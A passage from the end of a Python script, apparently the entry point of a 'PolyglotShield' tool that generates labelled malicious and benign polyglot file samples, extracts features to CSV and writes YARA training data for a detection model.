    parser.add_argument("--samples", type=int, default=50, help="Samples per polyglot type")
    parser.add_argument("--output", default="training_data", help="Output directory")
    parser.add_argument("--csv", default="training_dataset.csv", help="Output CSV filename")
    parser.add_argument("--yara", default="yara_training.json", help="YARA training data JSON")
    args = parser.parse_args()

    print("=" * 60)
    print("  POLYGLOTSHIELD — Training Data Generator")
    print("  Sources: Polydet DB, mindcrypt/polyglot, RedTeam Builder")
    print("=" * 60)
    print(f"\n  Polyglot types: {len(POLYGLOT_TYPES)}")
    print(f"  Samples per type: {args.samples}")
    print(f"  Output: {args.output}/\n")

    gen = ComprehensiveGenerator(args.output)

    print("[*] Generating samples...")
    samples = gen.generate_dataset(n_per_type=args.samples)
    mal = sum(1 for _, l, _, _ in samples if l == 1)
    ben = sum(1 for _, l, _, _ in samples if l == 0)
    print(f"    Generated: {len(samples)} total ({mal} malicious, {ben} benign)")

    print("[*] Extracting features...")
    n_ok, n_fail = extract_and_export(samples, args.csv)
    print(f"    Extracted: {n_ok} OK, {n_fail} failed")
    print(f"    CSV: {args.csv}")

    print("[*] Generating YARA training data...")
    n_yara = generate_yara_training_data(samples, args.yara)
    print(f"    YARA data: {n_yara} samples → {args.yara}")

    # Summary
    print("\n" + "=" * 60)
    print("  DATASET SUMMARY")
    print("=" * 60)
    print(f"  Total samples:    {len(samples)}")
    print(f"  Malicious:        {mal}")
    print(f"  Benign:           {ben}")
    print(f"  Features:         {len(get_feature_names())}")
    print(f"  Polyglot types:   {len(POLYGLOT_TYPES)}")
    print(f"  CSV file:         {args.csv}")
    print(f"  YARA data:        {args.yara}")
    print(f"  Sample dir:       {args.output}/")
    print("=" * 60)

    # Type breakdown
    from collections import Counter
    type_counts = Counter(ptype for _, _, ptype, _ in samples)
    print("\n  Samples by type:")
    for ptype, count in type_counts.most_common():
        print(f"    {ptype:25s} {count:5d}")

    print(f"\n  Ready for training!")
    print(f"  Run: python train_model.py --data {args.csv}")


if __name__ == "__main__":
    main()
